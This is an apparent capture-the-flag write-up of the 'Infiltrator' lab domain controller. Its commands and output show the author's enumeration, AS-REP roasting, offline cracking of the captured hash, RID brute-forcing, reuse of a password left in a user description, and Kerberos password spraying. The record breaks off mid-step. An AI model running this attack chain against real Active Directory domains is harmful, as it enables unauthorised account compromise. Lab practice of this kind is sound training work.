# Host file setup
```python
sudo nxc smb 10.129.232.99 --generate-hosts-file /etc/hosts 
SMB         10.129.232.99   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn dc01.infiltrator.htb -vv

Nmap scan report for dc01.infiltrator.htb (10.129.232.99)
Host is up, received user-set (0.015s latency).
rDNS record for 10.129.232.99: DC01.infiltrator.htb
Scanned at 2026-10-04 16:17:05 BST for 65s
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
3389/tcp  open  ms-wbt-server    syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
15220/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49694/tcp open  unknown          syn-ack
49695/tcp open  unknown          syn-ack
49700/tcp open  unknown          syn-ack
49726/tcp open  unknown          syn-ack
49749/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 66.20 seconds
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985 -A --min-rate=2000 -sT -Pn dc01.infiltrator.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 16:19 +0100
Nmap scan report for dc01.infiltrator.htb (10.129.232.99)
Host is up (0.015s latency).
rDNS record for 10.129.232.99: DC01.infiltrator.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Infiltrator.htb
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-04 15:19:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2026-10-04T15:21:00+00:00; 0s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-04T15:21:00+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-04T15:21:00+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2026-10-04T15:21:00+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INFILTRATOR
|   NetBIOS_Domain_Name: INFILTRATOR
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: infiltrator.htb
|   DNS_Computer_Name: dc01.infiltrator.htb
|   DNS_Tree_Name: infiltrator.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-04T15:20:20+00:00
|_ssl-date: 2026-10-04T15:21:00+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc01.infiltrator.htb
| Not valid before: 2026-10-03T15:14:53
|_Not valid after:  2027-04-04T15:14:53
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth is enabled, but cannot use it to enumerate in anyway

Guest account is also disabled

# HTTP (80)

There is not a lot of functionality on this page

![860](Pasted%20image%2020261004162621.png)

Found some potential users

![861](Pasted%20image%2020261004162645.png)

![861](Pasted%20image%2020261004162705.png)

More potential users

```python
david anderson
olivia martinez
kevin turner
amanda walker
marcus harris
lauren clark
ethan rodriguez
```

## Valid users
```python
./username-anarchy -i ../potential-users.txt | tee ../AD-users.txt
```

Ill use username anarchy to generate some users

```python
kerbrute userenum --dc dc01.infiltrator.htb -d infiltrator.htb AD-users.txt       

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/04/26 - Ronnie Flathers @ropnop

2026/10/04 16:39:05 >  Using KDC(s):
2026/10/04 16:39:05 >  	dc01.infiltrator.htb:88

2026/10/04 16:39:05 >  [+] VALID USERNAME:	d.anderson@infiltrator.htb
2026/10/04 16:39:05 >  [+] VALID USERNAME:	o.martinez@infiltrator.htb
2026/10/04 16:39:05 >  [+] VALID USERNAME:	k.turner@infiltrator.htb
2026/10/04 16:39:05 >  [+] VALID USERNAME:	a.walker@infiltrator.htb
2026/10/04 16:39:05 >  [+] VALID USERNAME:	m.harris@infiltrator.htb
2026/10/04 16:39:05 >  [+] VALID USERNAME:	e.rodriguez@infiltrator.htb
2026/10/04 16:39:05 >  [+] VALID USERNAME:	l.clark@infiltrator.htb
2026/10/04 16:39:05 >  Done! Tested 105 usernames (7 valid) in 0.168 seconds
```

These users are valid

# ASREP roasting leads to user compromise

After getting some valid users ill try some ASREP roasting

```python
nxc ldap dc01.infiltrator.htb -u AD-users.txt -p '' --asreproast asrep.hash                     
LDAP        10.129.232.99   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb) (signing:None) (channel binding:Never)

LDAP        10.129.232.99   389    DC01             $krb5asrep$23$l.clark@INFILTRATOR.HTB:192232ede506ead876ad8384319c6ce7$0429782ae1f76ac609275e9e28300033c8fb14218584e43aa6aaffbf692923853a8c02ad8872dcbdcd6c30249a6a4820fb6f183e45acd852097fd2b6bd92305d4186087eb56dadeb936598994b80cae579c1f6ba224b768eedbccba9fdf8caab2706de9700e2760d30beb13be4fecbc8114688e2b3646f6a5eb2192d4597d626cfc62b210e1031cf915194b1b52b13332ec280e601e5e3ee32b395cb68943b18d532b6d930518279b2654837c9f33668e5c6dcb50ce10d61cb5fe09dad84c95569cadd2453750ca24bf036cdf7af63bbd738fafb7bde4e85710ccc9c008363dd6cc1e380bff21d4f8473a24ce9acafaa2be3
```

I have managed to get a hash

```python
hashcat asrep.hash /usr/share/wordlists/rockyou.txt

$krb5asrep$23$l.clark@INFILTRATOR.HTB:192232ede506ead876ad8384319c6ce7$0429782ae1f76ac609275e9e28300033c8fb14218584e43aa6aaffbf692923853a8c02ad8872dcbdcd6c30249a6a4820fb6f183e45acd852097fd2b6bd92305d4186087eb56dadeb936598994b80cae579c1f6ba224b768eedbccba9fdf8caab2706de9700e2760d30beb13be4fecbc8114688e2b3646f6a5eb2192d4597d626cfc62b210e1031cf915194b1b52b13332ec280e601e5e3ee32b395cb68943b18d532b6d930518279b2654837c9f33668e5c6dcb50ce10d61cb5fe09dad84c95569cadd2453750ca24bf036cdf7af63bbd738fafb7bde4e85710ccc9c008363dd6cc1e380bff21d4f8473a24ce9acafaa2be3:WAT?watismypass!
```

The hash cracked

```python
nxc smb dc01.infiltrator.htb -u l.clark -p 'WAT?watismypass!'              
SMB         10.129.232.99   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.99   445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
```

This user is compromised

```python
nxc smb dc01.infiltrator.htb -u l.clark -p 'WAT?watismypass!' --shares  
SMB         10.129.232.99   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.99   445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
SMB         10.129.232.99   445    DC01             [*] Enumerated shares
SMB         10.129.232.99   445    DC01             Share           Permissions     Remark
SMB         10.129.232.99   445    DC01             -----           -----------     ------
SMB         10.129.232.99   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.99   445    DC01             C$                              Default share
SMB         10.129.232.99   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.99   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.99   445    DC01             SYSVOL          READ            Logon server share
```

Just default shares

```python
nxc smb dc01.infiltrator.htb -u l.clark -p 'WAT?watismypass!' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
D.anderson
L.clark
M.harris
O.martinez
A.walker
K.turner
E.rodriguez
winrm_svc
infiltrator_svc$
lan_managment
```

Ill also dump the users using `--rid-brute` since that will also get machine accounts

# Password stored in user descriptions
```python
nxc smb dc01.infiltrator.htb -u l.clark -p 'WAT?watismypass!' --users
SMB         10.129.232.99   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.99   445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
SMB         10.129.232.99   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.232.99   445    DC01             Administrator                 2024-08-21 19:58:28 0       Built-in account for administering the computer/domain 
SMB         10.129.232.99   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.232.99   445    DC01             krbtgt                        2023-12-04 17:36:16 0       Key Distribution Center Service Account 
SMB         10.129.232.99   445    DC01             D.anderson                    2023-12-04 18:56:02 0        
SMB         10.129.232.99   445    DC01             L.clark                       2023-12-04 19:04:24 0        
SMB         10.129.232.99   445    DC01             M.harris                      2026-10-04 15:41:43 0        
SMB         10.129.232.99   445    DC01             O.martinez                    2024-02-25 15:41:03 0        
SMB         10.129.232.99   445    DC01             A.walker                      2023-12-05 22:06:28 0        
SMB         10.129.232.99   445    DC01             K.turner                      2024-02-25 15:40:35 0       MessengerApp@Pass! 
SMB         10.129.232.99   445    DC01             E.rodriguez                   2026-10-04 15:41:43 0        
SMB         10.129.232.99   445    DC01             winrm_svc                     2024-08-02 22:42:45 0        
SMB         10.129.232.99   445    DC01             lan_managment                 2024-08-02 22:42:46 0        
SMB         10.129.232.99   445    DC01             [*] Enumerated 12 local users: INFILTRATOR
```

Found another password 

There is no lockout policy on the domain

```python
nxc smb dc01.infiltrator.htb -u users.txt -p 'MessengerApp@Pass!' --continue-on-success
SMB         10.129.232.99   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\Administrator:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\Guest:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\krbtgt:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\DC01$:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\D.anderson:MessengerApp@Pass! STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\L.clark:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\M.harris:MessengerApp@Pass! STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\O.martinez:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\A.walker:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\K.turner:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\E.rodriguez:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\winrm_svc:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\infiltrator_svc$:MessengerApp@Pass! STATUS_LOGON_FAILURE 
SMB         10.129.232.99   445    DC01             [-] infiltrator.htb\lan_managment:MessengerApp@Pass! STATUS_LOGON_FAILURE
```

Two users are shows to have a status account restriction, `d.anderson` and `m.harris`

```python
bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -u l.clark -p 'WAT?watismypass!' get object 'm.harris'

memberOf: CN=Developers,CN=Users,DC=infiltrator,DC=htb; CN=Protected Users,CN=Users,DC=infiltrator,DC=htb; CN=Remote Management Users,CN=Builtin,DC=infiltrator,DC=htb
```

```python
bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -u l.clark -p 'WAT?watismypass!' get object 'd.anderson'

memberOf: CN=Marketing_Team,CN=Users,DC=infiltrator,DC=htb; CN=Protected Users,CN=Users,DC=infiltrator,DC=htb
```

Both are part of protected users this explains why there is a restriction

However using kerberos auth fails on both which is usually a bypass for protected users

# Password spray leads to user compromise

```python
nxc smb dc01.infiltrator.htb -u users.txt -p 'WAT?watismypass!' --continue-on-success -k
SMB         dc01.infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\Administrator:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\Guest:WAT?watismypass! KDC_ERR_CLIENT_REVOKED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\krbtgt:WAT?watismypass! KDC_ERR_CLIENT_REVOKED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\DC01$:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\D.anderson:WAT?watismypass! 
SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\L.clark:WAT?watismypass! 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\M.harris:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\O.martinez:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\A.walker:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\K.turner:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\E.rodriguez:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\winrm_svc:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\infiltrator_svc$:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\lan_managment:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
```

This has compromised the user `d.anderson`

![](Pasted%20image%2020261004175447.png)

This user has GenericAll on the `Marketing digital` OU

![938](Pasted%20image%2020261004175540.png)

This OU contains the `e.rodriguez` user, this means i can apply an inheritance rule to the OU to get GenericAll over `e.rodriguez`

# Compromising `e.rodriguez`

```python
nxc smb dc01.infiltrator.htb -u d.anderson -p 'WAT?watismypass!' -k --generate-tgt d.anderson
SMB         dc01.infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\d.anderson:WAT?watismypass! 
SMB         dc01.infiltrator.htb 445    DC01             [+] TGT saved to: d.anderson.ccache
SMB         dc01.infiltrator.htb 445    DC01             [+] Run the following command to use the TGT: export KRB5CCNAME=d.anderson.ccache
```

First ill get a TGT for the user with privs

```python
export KRB5CCNAME=d.anderson.ccache
```

Then ill export it

```python

```




